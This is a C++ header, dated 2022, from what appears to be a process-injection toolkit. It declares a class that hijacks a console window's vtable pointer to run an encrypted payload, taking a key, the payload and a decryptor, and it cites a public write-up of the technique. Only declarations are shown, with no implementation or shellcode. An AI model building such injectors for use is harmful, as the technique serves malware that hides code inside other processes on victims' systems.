//
// Created by Eteli on 07/03/2022.
//
#include "../Injector.h"
#ifndef UNTITLED_CONSOLEWINDOWSCLASSINJECTION_H
#define UNTITLED_CONSOLEWINDOWSCLASSINJECTION_H

// The following injection method was described here: https://modexp.wordpress.com/2018/09/12/process-injection-user-data/
class ConsoleWindowsClassInjection: public Injector{
public:
    typedef struct _vftable_t {
        ULONG_PTR     EnableBothScrollBars;
        ULONG_PTR     UpdateScrollBar;
        ULONG_PTR     IsInFullscreen;
        ULONG_PTR     SetIsFullscreen;
        ULONG_PTR     SetViewportOrigin;
        ULONG_PTR     SetWindowHasMoved;
        ULONG_PTR     CaptureMouse;
        ULONG_PTR     ReleaseMouse;
        ULONG_PTR     GetWindowHandle;
        ULONG_PTR     SetOwner;
        ULONG_PTR     GetCursorPosition;
        ULONG_PTR     GetClientRectangle;
        ULONG_PTR     MapPoints;
        ULONG_PTR     ConvertScreenToClient;
        ULONG_PTR     SendNotifyBeep;
        ULONG_PTR     PostUpdateScrollBars;
        ULONG_PTR     PostUpdateTitleWithCopy;
        ULONG_PTR     PostUpdateWindowSize;
        ULONG_PTR     UpdateWindowSize;
        ULONG_PTR     UpdateWindowText;
        ULONG_PTR     HorizontalScroll;
        ULONG_PTR     VerticalScroll;
        ULONG_PTR     SignalUia;
        ULONG_PTR     UiaSetTextAreaFocus;
        ULONG_PTR     GetWindowRect;
    } ConsoleWindow;

// just here for reference. it's not used here.
    typedef struct _userData_t {
        ULONG_PTR vTable;     // gets replaced with new table pointer
        ULONG_PTR pUnknown;   // some undefined memory pointer
        HWND      hWnd;
        BYTE      buf[100];   // don't care
    } UserData;

    void Inject() override;
    ConsoleWindowsClassInjection(unsigned char* key, unsigned char *payload, unsigned int payload_len, unsigned int key_len, Decryptor *dec, char* procNAme): Injector(key, payload, payload_len, key_len, dec){}
};


#endif //UNTITLED_CONSOLEWINDOWSCLASSINJECTION_H
